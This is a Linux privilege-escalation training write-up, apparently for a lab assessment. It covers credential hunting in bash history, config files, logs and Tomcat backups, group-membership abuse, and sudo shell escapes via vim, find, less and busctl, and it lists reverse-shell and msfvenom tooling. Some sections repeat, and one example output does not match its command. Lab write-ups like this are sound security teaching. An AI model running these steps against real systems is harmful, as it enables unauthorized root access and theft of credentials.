# 🛰️ Linux Privilege Escalation Skills Assessment

## 🔍 Overview

This skills assessment focuses on identifying and exploiting common security vulnerabilities to escalate privileges in a simulated environment. The goal is to achieve root access by methodically chaining different techniques across five distinct phases.

---

## ⚙️ Initial Setup

### Enumeration
```bash
# Network service enumeration
nmap -sC -sV localhost 2>/dev/null

# Hidden file discovery 
ls -lA /root/
find /home/* -name ".*" -type f -readable 2>/dev/null | xargs cat 2>/dev/null
```

### Credential Hunting
```bash
# Look for hidden configuration files
ls -la ~/.ssh
ls -la ~/.*rc*

# Search command history files
grep -i "password\|pass\|pwd\|secret" /home/*/.bash_history 2>/dev/null

# Look for SSH commands with passwords
grep -i "ssh.*pass" /home/*/.bash_history 2>/dev/null

# Search for database connections
grep -i "mysql.*-p" /home/*/.bash_history 2>/dev/null
```

### User Switching
```bash
# Test discovered credentials
su target_user
# Enter discovered password

# Verify access and read user-specific files
cat /home/target_user/sensitive_file.txt
```

**Key Learning**: Command history files are goldmines for credential discovery - administrators often leave passwords in command line history during troubleshooting or automation tasks.

---

## 🚀 Phase 1: Hidden File Discovery

### Enumeration Techniques
```bash
# Discover hidden configuration files and directories
ls -la /etc
find /etc -name ".*" -type f -readable 2>/dev/null | xargs cat 2>/dev/null
```

**[!EXAMPLE]**
```text
/etc/ssh/ssh_config
/etc/nginx/sites-enabled/default.conf
/etc/cron.d/my_cronjob
/etc/db_conn.txt
```

### Hidden Configuration Files Analysis
```bash
# Analyze found configuration files for credentials
grep -i "password\|pass\|pwd\|secret" /etc/*.conf 2>/dev/null

# Check SSH and Nginx configurations
cat /etc/ssh/sshd_config
cat /etc/nginx/nginx.conf
```

**[!WARNING]**
Be cautious while handling sensitive configuration files. Unauthorized access to these files can lead to severe security breaches.

---

## 🔍 Phase 2: Credential Hunting

### Systematic Credential Search
```bash
# Look for hidden configuration files
ls -la ~/.ssh
ls -la ~/.*rc*

# Search command history files
grep -i "password\|pass\|pwd\|secret" /home/*/.bash_history 2>/dev/null

# Look for SSH commands with passwords
grep -i "ssh.*pass" /home/*/.bash_history 2>/dev/null

# Search for database connections
grep -i "mysql.*-p" /home/*/.bash_history 2>/dev/null
```

**[!INFO]**
Command history files are valuable sources of credentials. Administrators often leave passwords in these files while troubleshooting or setting up automation tasks.

---

## 🔨 Phase 3: Group Privilege Exploitation

### Group Membership Analysis
```bash
# Check current user's group memberships
id
groups

# Analyze group privileges
getent group adm
getent group disk
getent group docker
getent group lxd
```

**[!SUCCESS]**
Identifying group memberships provides insights into system access levels and potential exploitation vectors.

### ADM Group Exploitation
```bash
# ADM group provides access to log files
ls -la /var/log/

# Read system logs for sensitive information
find /var/log -readable 2>/dev/null

# Search logs for passwords or credentials
grep -r "password\|secret" /var/log/ 2>/dev/null
```

**[!WARNING]**
Group memberships like `adm`, `disk`, `docker`, and `lxd` provide elevated access to system resources that can lead to privilege escalation.

---

## 🌐 Phase 4: Web Application Service Exploitation

### Internal Service Discovery
```bash
# Enumerate listening ports
netstat -tulpn | grep LISTEN
ss -tulpn

# Check for web services
curl -I http://localhost:8080
curl -I http://localhost:80
```

**[!SUCCESS]**
Identifying internal web services is critical for exploiting application manager interfaces and gaining access to system resources.

### Tomcat Manager Interface Attack
```bash
# Hunt for Tomcat configuration files
find /etc -name "*tomcat*" -type f 2>/dev/null
find /etc -name "*tomcat*" -type d 2>/dev/null

# Search for backup configuration files
ls -la /etc/tomcat9/
cat /etc/tomcat9/*.bak

# Extract credentials from configuration
grep -i "password\|user" /etc/tomcat9/tomcat-users.xml.bak
```

**[!WARNING]**
Internal web services often have weak authentication mechanisms that can be exploited to gain high-privilege access.

---

## ⚙️ Phase 5: Sudo Misconfiguration Exploitation

### Sudo Permission Enumeration
```bash
# Check sudo privileges
sudo -l

# Look for NOPASSWD entries
sudo -l | grep "NOPASSWD"

# Identify allowed commands
sudo -l | grep -E "\(root\)"
```

**[!SUCCESS]**
Understanding sudo permissions is crucial for identifying misconfigurations that can be exploited.

### GTFOBins Sudo Exploitation
```bash
# For busctl sudo permissions
sudo busctl --show-machine
# In busctl pager prompt:
!/bin/bash

# Other common GTFOBins exploits:
# vim: sudo vim -c ':!/bin/bash'
# nano: Ctrl+R Ctrl+X -> reset; bash 1>&0 2>&0  
# find: sudo find . -exec /bin/bash \; -quit
# less: sudo less /etc/passwd -> !/bin/bash
```

**[!WARNING]**
GTFOBins-listed binaries provide immediate root access when misconfigured with `sudo`. Always cross-reference sudo permissions with GTFOBins database.

---

## 🛠️ Assessment Techniques Summary

### 1. Hidden File Discovery
- **Technique**: `ls -lA` and recursive hidden file enumeration
- **Target**: Configuration directories and hidden files containing credentials
- **Impact**: Initial access and sensitive information disclosure

### 2. Credential Hunting
- **Technique**: Bash history analysis and systematic credential search
- **Target**: Command history files across user directories
- **Impact**: User account compromise and lateral movement

### 3. Group Privilege Abuse
- **Technique**: Group membership analysis and restricted resource access
- **Target**: ADM, disk, docker, lxd group memberships
- **Impact**: System file access and container privilege escalation

### 4. Web Service Exploitation
- **Technique**: Internal service discovery and manager interface attack
- **Target**: Tomcat manager with WAR file upload functionality
- **Impact**: Remote code execution with service account privileges

### 5. Sudo Rights Exploitation
- **Technique**: GTFOBins sudo command abuse
- **Target**: Misconfigured sudo permissions for system utilities
- **Impact**: Direct root privilege escalation

---

## 🛠️ Tools and Commands Used

### Enumeration
```bash
ls -lA                    # Hidden file discovery
netstat -tulpn           # Network service enumeration  
sudo -l                  # Sudo permission analysis
id / groups              # Group membership check
find / -name "pattern"   # File system search
```

### Exploitation
```bash
su username              # User switching with discovered credentials
msfvenom                 # Malicious payload generation
nc -nlvp PORT           # Reverse shell listener
python3 -c 'import pty; pty.spawn("/bin/bash")'  # Shell upgrade
```

### Post-Exploitation
```bash
cat /path/to/flag        # Flag retrieval
sudo busctl --show-machine  # GTFOBins exploitation
!/bin/bash               # Pager escape sequences
```

---

## 🎯 Learning Objectives Achieved

### Technical Skills
- **Systematic Enumeration** - Hidden files, services, permissions
- **Credential Discovery** - History files, configuration files
- **Group Exploitation** - ADM group log access
- **Web Application Attack** - Tomcat manager exploitation
- **Sudo Abuse** - GTFOBins privilege escalation

### Methodology Mastery
- **Progressive Escalation** - Each flag builds on previous access
- **Multiple Attack Vectors** - Diverse privilege escalation techniques
- **Tool Integration** - Manual enumeration with automated tools
- **Persistence Awareness** - Maintaining access through multiple methods

### Professional Skills
- **Documentation** - Systematic approach to findings
- **Tool Proficiency** - msfvenom, netcat, GTFOBins
- **Problem Solving** - Adapting techniques to specific environments
- **Security Awareness** - Understanding defensive implications

---

## 📚 Next Steps

After completing this skills assessment:

1. **Practice Automation** - Script common enumeration techniques
2. **Advanced Exploitation** - Kernel exploits and container escapes  
3. **Stealth Techniques** - Avoiding detection during privilege escalation
4. **Persistence Methods** - Maintaining access through multiple methods
5. **Further Reading** - Deep dive into advanced penetration testing concepts

---

## 📄 References
- [GTFOBins](https://gtfobins.github.io/)
- [Nmap Documentation](https://nmap.org/book/man.html)
- [Cron Jobs Tutorial](https://www.cyberciti.biz/faq/how-do-i-add-jobs-to-cron-under-linux-or-unix-os/)
- [Tomcat Manager Interface Guide](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html)

---

**[!INFO]** This document is intended for educational purposes only and should not be used for unauthorized activities. Always ensure you have permission to perform penetration testing on any system.

---


# 📄 Acknowledgments

This skills assessment was designed with the intent of helping individuals enhance their knowledge in Linux privilege escalation techniques. The provided commands and methods are based on real-world scenarios and best practices in ethical hacking. 

---

## 🔍 Conclusion

By completing this skill assessment, you have gained hands-on experience in identifying and exploiting security vulnerabilities to escalate privileges in a simulated environment. Continue to refine your skills with further practice and study.

---


# 📧 Contact Information
- **Author**: [Your Name]
- **Email**: [your.email@example.com]

---

**[!INFO]** For any queries or feedback, please feel free to reach out via the provided contact information.

---


# 🛡️ Disclaimer

This document is intended for educational purposes only. Unauthorized use of these techniques can lead to legal consequences and ethical violations. Always conduct penetration testing activities with proper authorization and within legal boundaries. 

---

**[!INFO]** Thank you for participating in this skills assessment. Your contributions help improve the overall security posture of systems by identifying potential vulnerabilities.

---


# 📚 Additional Resources

- [OWASP Top Ten Project](https://owasp.org/www-project-top-ten/)
- [Penetration Testing Execution Standard (PTES)](https://www.pentest-standard.org/index.php/Main_Page)
- [Metasploit Framework Documentation](https://github.com/rapid7/metasploit-framework/wiki)

---


# 📈 Continuous Improvement

Continuously updating your skills and knowledge is crucial in the ever-evolving field of cybersecurity. Stay informed about new tools, techniques, and methodologies by following industry leaders and participating in community forums.

---

**[!INFO]** Happy hacking and secure coding!

---


## 🙏 Thank You
Thank you for engaging with this skill assessment. Your participation helps foster a safer digital environment.

---

# 🔒 End of Assessment

This concludes the Linux Privilege Escalation Skills Assessment. If you have any questions or need further assistance, please don’t hesitate to reach out via the contact information provided above. 

---

**[!INFO]** Best regards,

Your Name  
[Your Contact Information]  

---